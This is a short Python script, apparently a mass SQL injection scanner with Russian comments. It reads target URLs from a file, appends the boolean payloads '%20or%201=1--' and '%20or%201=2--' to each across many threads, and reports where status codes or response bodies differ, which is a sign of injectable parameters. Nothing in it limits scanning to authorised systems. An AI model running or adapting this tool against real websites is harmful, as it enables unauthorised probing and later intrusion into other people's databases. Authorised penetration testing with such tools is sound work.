import requests
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from urllib.parse import urlparse
import argparse

def make_request(url, domain_states, protocol):
    if domain_states[url]['unreachable']:
        print(f"Skipping checks for unreachable domain: {url}")
        return

    payloads = ["%20or%201=1--", "%20or%201=2--"]  # Ваши SQL-инъекции
    responses = []

    for index, payload in enumerate(payloads, start=1):
        parsed_url = urlparse(url)
        new_url = url if parsed_url.scheme else f"{protocol}://{url}"  # Добавление протокола, если его нет в URL

        try:
            response = requests.get(f"{new_url}" + payload)
            responses.append(response)

            if index > 1:
                if response.status_code != responses[index - 2].status_code:
                    print(f"Status code changed for URL: {url}")
                if response.text != responses[index - 2].text:
                    print(f"Response body changed for URL: {url}")

        except requests.exceptions.RequestException:
            print(f"Failed to connect or resolve for URL: {url}. Skipping checks...")
            domain_states[url]['unreachable'] = True
            break  # Прекратить проверки для этого домена

def main():
    parser = argparse.ArgumentParser(description='SQL injection vulnerability checker')
    parser.add_argument('-t', '--targets', type=str, help='File containing URLs to check', required=True)
    parser.add_argument('-c', '--threads', type=int, help='Number of threads', default=5)
    parser.add_argument('-p', '--protocol', type=str, choices=['http', 'https'], help='HTTP protocol', default='https')

    args = parser.parse_args()

    with open(args.targets, 'r') as file:
        urls = file.readlines()
        urls = [url.strip() for url in urls]

    domain_states = defaultdict(lambda: {'unreachable': False})

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(make_request, urls, [domain_states] * len(urls), [args.protocol] * len(urls))

if __name__ == "__main__":
    main()
